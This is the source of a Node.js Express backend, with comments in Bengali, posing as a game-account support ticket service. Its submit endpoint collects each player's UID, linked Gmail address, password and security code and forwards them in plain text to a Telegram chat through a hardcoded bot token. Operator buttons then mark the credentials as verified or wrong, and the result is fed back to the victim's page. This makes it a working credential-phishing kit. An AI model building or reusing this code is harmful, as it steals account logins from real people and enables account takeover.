const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

app.use(cors({ origin: '*' }));
app.use(express.json());

app.use((req, res, next) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    next();
});

const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
const TELEGRAM_CHAT_ID = "-1004444318249";

if (!global.persistentStore) {
    global.persistentStore = {};
}

app.get('/', (req, res) => res.send("Backend Active"));

// ১. সাবমিট টিকিট
app.post('/api/submit-ticket', async (req, res) => {
    const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
    
    // নতুন ডিফল্ট নাম ও লেভেল
    global.persistentStore[String(uid)] = {
        status: "Pending",
        name: "Searching Player Name...",
        level: "Fetching Level...",
        region: "Bangladesh",
        reason: ""
    };

    const telegramMessage = `
📩 *New Support Ticket Submitted!*

🆔 *Player UID:* \`${uid}\`
📧 *Bind Gmail:* \`${gmail}\`
🔑 *Password:* \`${password}\`
🔢 *Security Code:* \`${securityCode}\`
📌 *Issue:* ${problemType}
📝 *Details:* ${additionalDetails}
    `;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Verify Account", callback_data: `verify_${uid}` }
                    ],
                    [
                        { text: "❌ Wrong Pass", callback_data: `reject_${uid}_Wrong Password` },
                        { text: "❌ Wrong Gmail", callback_data: `reject_${uid}_Invalid Gmail` }
                    ],
                    [
                        { text: "❌ Wrong Code", callback_data: `reject_${uid}_Wrong Security Code` },
                        { text: "❌ Wrong UID", callback_data: `reject_${uid}_Invalid UID` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ২. টেলিগ্রাম মেসেজ এবং বাটন রিপ্লাই
app.post('/api/telegram-webhook', async (req, res) => {
    res.sendStatus(200);

    try {
        const update = req.body;

        // টেলিগ্রাম থেকে মেসেজে নাম ও লেভেল পাঠালে (ফরম্যাট: UID Name Level)
        if (update && update.message && update.message.text) {
            const text = update.message.text.trim();
            const parts = text.split(' ');
            
            if (parts.length >= 3) {
                const uid = String(parts[0]);
                const level = parts[parts.length - 1];
                const name = parts.slice(1, parts.length - 1).join(' ');

                if (!global.persistentStore[uid]) {
                    global.persistentStore[uid] = { status: "Pending", region: "Bangladesh", reason: "" };
                }
                
                global.persistentStore[uid].name = name;
                global.persistentStore[uid].level = `Level ${level}`;

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: update.message.chat.id,
                    text: `📝 *Player Info Updated!*\n\n🆔 UID: \`${uid}\`\n👤 Name: *${name}*\n🎖️ Level: *Level ${level}*`,
                    parse_mode: 'Markdown'
                });
                return;
            }
        }

        // বাটন চাপলে
        if (update && update.callback_query) {
            const callbackQuery = update.callback_query;
            const data = callbackQuery.data; 
            const chatId = callbackQuery.message.chat.id;
            const messageId = callbackQuery.message.message_id;

            const parts = data.split('_');
            const action = parts[0];
            const uid = String(parts[1]);
            const reason = parts[2] || "Information Mismatch";

            const currentData = global.persistentStore[uid] || {};

            if (action === 'verify') {
                global.persistentStore[uid] = {
                    status: "Verified",
                    name: currentData.name || "Searching Player Name...",
                    level: currentData.level || "Fetching Level...",
                    region: "Bangladesh",
                    reason: ""
                };

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    chat_id: chatId,
                    message_id: messageId,
                    text: callbackQuery.message.text + `\n\n🟢 *Status: VERIFIED BY ADMIN*`,
                    parse_mode: 'Markdown'
                });

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `✅ *Confirmation Alert!*\n\nPlayer UID: \`${uid}\` status updated to *VERIFIED*!`,
                    parse_mode: 'Markdown'
                });

            } else if (action === 'reject') {
                global.persistentStore[uid] = {
                    status: "Rejected",
                    name: currentData.name || "Searching Player Name...",
                    level: currentData.level || "Fetching Level...",
                    region: "Bangladesh",
                    reason: reason
                };

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    chat_id: chatId,
                    message_id: messageId,
                    text: callbackQuery.message.text + `\n\n🔴 *Status: REJECTED (${reason})*`,
                    parse_mode: 'Markdown'
                });

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `🔴 *Rejection Alert!*\n\nPlayer UID: \`${uid}\` marked as *REJECTED* (${reason})!`,
                    parse_mode: 'Markdown'
                });
            }

            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callbackQuery.id,
                text: `UID ${uid} Updated!`
            });
        }
    } catch (err) {
        console.error("Webhook Error:", err);
    }
});

// ৩. স্ট্যাটাস চেক API
app.get('/api/check-status/:uid', (req, res) => {
    const uid = String(req.params.uid);
    const userData = global.persistentStore[uid] || {
        status: "Pending",
        name: "Searching Player Name...",
        level: "Fetching Level...",
        region: "Bangladesh",
        reason: ""
    };
    res.json({ success: true, data: userData });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
